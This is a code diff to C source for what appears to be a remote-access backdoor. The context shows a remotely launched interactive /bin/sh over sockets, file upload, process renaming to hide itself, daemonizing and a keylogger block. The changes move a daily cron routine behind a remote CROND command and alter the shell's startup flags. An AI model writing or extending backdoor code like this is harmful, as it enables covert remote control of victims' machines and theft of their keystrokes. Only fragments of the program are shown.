@@ -4,25 +4,26 @@
 #include <signal.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/stat.h>
 #include <fcntl.h>
-#include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <errno.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
 #include <termios.h>
 #include <netdb.h>
-
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #include "raw.h"
 #include "../include/config.h"
 #include "../include/actions.h"
 
 #define CHECKSTR "check"
-#define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "
+//#define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "
 #define MAXDIRECTRAW 100
 
 int weekday;
@@ -41,8 +42,8 @@ char *envp[] = {
 
 char  *argv[] = {
       "/bin/sh",
-      "--noprofile",
-      "--norc",
+//      "--noprofile",
+//      "--norc",
       "-i",
       NULL
 };
@@ -80,7 +81,6 @@ struct rawsock *findrawsock(int port) {
 
 
 // Cron function
-#if CRON
 void cron(int n) {
     char buffer[256];
 
@@ -106,7 +106,6 @@ void cron(int n) {
     // Launched every 24h
     alarm(60*60*24);
 }
-#endif
 
 void rename_proc(char **argv, int argc) {
     int i;
@@ -226,6 +225,13 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
 
 static inline int max(int a, int b) {
     return a > b ? a : b;
+}
+
+void launcher_crond() {
+    // Cron
+    debug("Initializing crond\n");
+    signal(SIGALRM, cron);
+    alarm(60*60*24);
 }
 
 void launcher_shell(int sockr, int sockw) {
@@ -387,7 +393,9 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
                 close(sock);
             }
             break;
-
+		case CROND:
+			launcher_crond();
+			break;
         default:
             debug("Invalid option: %d\n", d->action);
     }
@@ -542,12 +550,6 @@ int main(int argc, char **argv) {
     daemonize();
 #endif
 
-    // Cron
-#if CROND
-    debug("Initializing crond\n");
-    signal(SIGALRM, cron);
-    alarm(60*60*24);
-#endif
 
 #ifdef KEYLOGGER
     debug("Initializing keylogger\n");
